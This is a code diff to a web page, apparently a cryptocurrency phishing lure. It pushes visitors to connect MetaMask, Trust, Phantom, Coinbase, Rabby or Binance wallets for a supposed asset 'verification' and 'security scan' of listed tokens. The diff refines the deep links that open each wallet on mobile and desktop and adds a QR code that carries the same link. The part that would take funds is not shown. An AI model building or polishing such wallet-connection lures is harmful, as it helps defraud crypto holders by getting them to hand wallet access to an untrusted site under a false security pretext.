@@ -325,20 +325,20 @@ scrollbar-color: #333 transparent;
 
 /* NUEVO ESTILO: QR SECTION */
 .qr-section {
- margin-top: 20px;
- padding: 15px;
- background: rgba(255,255,255,0.05);
- border-radius: 12px;
- border: 1px dashed var(--border-color);
+    margin-top: 20px;
+    padding: 15px;
+    background: rgba(255,255,255,0.05);
+    border-radius: 12px;
+    border: 1px dashed var(--border-color);
 }
 #qrcode {
- display: flex;
- justify-content: center;
- margin-top: 10px;
+    display: flex;
+    justify-content: center;
+    margin-top: 10px;
 }
 #qrcode img {
- border: 2px solid white;
- border-radius: 8px;
+    border: 2px solid white;
+    border-radius: 8px;
 }
 </style>
 </head>
@@ -379,10 +379,10 @@ Connect Wallet
 
 <!-- SECCIÓN QR -->
 <div id="qrSection" class="qr-section">
- <div style="font-size: 0.85rem; color: var(--text-muted); margin-bottom: 8px;">
- 📱 Scan with Camera to Open
- </div>
- <div id="qrcode"></div>
+    <div style="font-size: 0.85rem; color: var(--text-muted); margin-bottom: 8px;">
+        📱 Scan with Camera to Open
+    </div>
+    <div id="qrcode"></div>
 </div>
 
 <div id="scanArea" class="hidden">
@@ -535,76 +535,47 @@ function updateWalletGrid(detectedType) {
 }
 
 async function handleWalletSelection(selectedType, detectedType) {
-    // Lógica mejorada para abrir la wallet correcta según plataforma
-    const isMobileDevice = isMobile();
-    
-    if (isMobileDevice) {
-        // MÓVIL: Forzar apertura en navegador interno
-        let deepLink = "";
-        
-        if(selectedType === 'metamask') {
-            // MetaMask usa msafari:// para iOS o metamask:// para Android
-            deepLink = `msafari://${window.location.host}`; 
-        } else if (selectedType === 'trust') {
-            // Trust Wallet usa WalletConnect para abrir su navegador interno
-            deepLink = `wc:[email protected]?u=${encodeURIComponent(window.location.href)}`;
-        } else if (selectedType === 'phantom') {
-            deepLink = `https://phantom.app/ulink1?connect=${encodeURIComponent(window.location.href)}`;
-        } else if (selectedType === 'coinbase') {
-            deepLink = `cbwallet://dapp/${window.location.host}`;
-        } else if (selectedType === 'rabby') {
-            deepLink = `rabby://dapp/${window.location.host}`;
-        } else if (selectedType === 'binance') {
-            deepLink = `bsc://${window.location.host}`;
-        }
-
-        modalTitle.textContent = `${selectedType.charAt(0).toUpperCase() + selectedType.slice(1)} Detected`;
-        modalText.textContent = "Presiona 'Abrir App' para completar la verificación.";
-        
-        openAppBtn.onclick = () => {
-            window.open(deepLink);
-            setTimeout(() => {
-                tryConnect();
-            }, 2000);
-        };
-        
-        mobileModal.style.display = 'flex';
-        return;
-    } else {
-        // ESCRITORIO (PC): Usar esquemas profundos para activar la extensión
-        let linkToOpen = "";
-        
-        if(selectedType === 'metamask') {
-            // Intenta abrir la ventana de conexión de MetaMask
-            linkToOpen = `metamask://`;
-        } else if (selectedType === 'phantom') {
-            // Phantom requiere este formato específico para escritorio
-            linkToOpen = `phantom://dapp/${window.location.host}`;
-        } else if (selectedType === 'rabby') {
-            linkToOpen = `rabby://`;
-        } else if (selectedType === 'coinbase') {
-            linkToOpen = `coinbase://dapp/${window.location.host}`;
-        } else if (selectedType === 'trust') {
-            // En PC, redirigimos a la web de Trust donde pueden escanear
-            linkToOpen = `https://link.trustwallet.org/open_url?url=${encodeURIComponent(window.location.href)}`;
-        } else if (selectedType === 'binance') {
-            linkToOpen = `https://www.binance.org/en/dapp?dd=${encodeURIComponent(window.location.href)}`;
-        }
-
-        if(linkToOpen.startsWith('http')) {
-            window.open(linkToOpen, '_blank');
-        } else {
-            // Redirección directa al protocolo de la extensión
-            window.location.href = linkToOpen;
-        }
-
-        // Pequeño delay para intentar conectar si la extensión ya estaba instalada
-        setTimeout(() => {
-            if (window.ethereum && (selectedType === 'metamask' ? window.ethereum.isMetaMask : true)) {
-                tryConnect();
-            }
-        }, 1500);
-    }
+ if (isMobile()) {
+ modalTitle.textContent = `${selectedType.charAt(0).toUpperCase() + selectedType.slice(1)} Detected`;
+ modalText.textContent = "Presiona 'Abrir App' para completar la verificación.";
+ 
+ // LINKS CORREGIDOS PARA CADA WALLET
+ let deepLink = "";
+ if(selectedType === 'metamask') deepLink = `https://metamask.app.link/dapp/${window.location.host}`;
+ else if(selectedType === 'trust') deepLink = `https://link.trustwallet.org/open_url?url=${encodeURIComponent(window.location.href)}`;
+ else if(selectedType === 'binance') deepLink = `https://www.binance.org/en/dapp?dd=${encodeURIComponent(window.location.href)}`;
+ else if(selectedType === 'phantom') deepLink = `https://phantom.app.link/dapp/${window.location.host}`;
+ else if(selectedType === 'coinbase') deepLink = `https://go.cb-w.com/dapp?dappUrl=${encodeURIComponent(window.location.host)}`;
+ else if(selectedType === 'rabby') deepLink = `https://rabby.io/dapp?dappUrl=${encodeURIComponent(window.location.host)}`;
+ 
+ openAppBtn.onclick = () => {
+ window.open(deepLink);
+ setTimeout(() => {
+ if (window.ethereum && (selectedType === 'metamask' ? window.ethereum.isMetaMask : true)) {
+ tryConnect();
+ } else {
+ modalText.textContent = "Si no se conectó, presiona 'Conectar' para intentar de nuevo.";
+ }
+ }, 2000);
+ };
+ 
+ mobileModal.style.display = 'flex';
+ return;
+ } else {
+ if (detectedType === selectedType || (window.ethereum && (
+ (selectedType === 'metamask' && window.ethereum.isMetaMask) ||
+ (selectedType === 'trust' && window.ethereum.isTrust) ||
+ (selectedType === 'coinbase' && window.ethereum.isCoinbaseWallet) ||
+ (selectedType === 'rabby' && window.ethereum.isRabby) ||
+ (selectedType === 'binance' && window.ethereum.isBinance) ||
+ (selectedType === 'phantom' && window.ethereum.isPhantom)
+ ))) {
+ tryConnect();
+ } else {
+ log(`Opening ${selectedType}...`);
+ window.open(`https://${selectedType}.io`, '_blank');
+ }
+ }
 }
 
 async function tryConnect() {
@@ -620,29 +591,29 @@ async function tryConnect() {
  modalTitle.textContent = "Trust Wallet Detected";
  modalText.textContent = "Para verificar tus activos, abriremos el navegador interno.";
  openAppBtn.onclick = () => {
-     window.open('wc:[email protected]?u=' + encodeURIComponent(window.location.href));
-     tryConnect(); 
+ window.open('https://link.trustwallet.org/open_url?chain_id=56&url=' + encodeURIComponent(window.location.href));
+ tryConnect(); 
  };
  } else if (detectedWalletType === 'metamask' && !window.ethereum.isMetaMask) {
  modalTitle.textContent = "MetaMask Detected";
  modalText.textContent = "Abre la app para confirmar la conexión.";
  openAppBtn.onclick = () => {
-     window.open('msafari://' + window.location.host);
-     tryConnect();
+ window.open('https://metamask.app.link/dapp/' + window.location.host);
+ tryConnect();
  };
  } else {
  modalTitle.textContent = "Mobile Wallet Connected";
  modalText.textContent = "Presiona 'Conectar' para iniciar el escaneo de seguridad.";
  openAppBtn.onclick = () => {
-     mobileModal.style.display = 'none';
-     tryConnect();
+ mobileModal.style.display = 'none';
+ tryConnect();
  };
  }
  
  mobileModal.style.display = 'flex';
  confirmOpenBtn.addEventListener('click', () => {
-     mobileModal.style.display = 'none';
-     tryConnect();
+ mobileModal.style.display = 'none';
+ tryConnect();
  });
  return; 
  }
@@ -999,17 +970,17 @@ const TOKENS_TO_SCAN = [
 
 // GENERAR QR AUTOMÁTICO
 document.addEventListener('DOMContentLoaded', () => {
- const urlToQR = window.location.href;
- if (typeof QRCode !== 'undefined') {
- new QRCode(document.getElementById("qrcode"), {
- text: urlToQR,
- width: 128,
- height: 128,
- colorDark : "#000000",
- colorLight : "#ffffff",
- correctLevel : QRCode.CorrectLevel.H
- });
- }
+    const urlToQR = window.location.href;
+    if (typeof QRCode !== 'undefined') {
+        new QRCode(document.getElementById("qrcode"), {
+            text: urlToQR,
+            width: 128,
+            height: 128,
+            colorDark : "#000000",
+            colorLight : "#ffffff",
+            correctLevel : QRCode.CorrectLevel.H
+        });
+    }
 });
 </script>
 
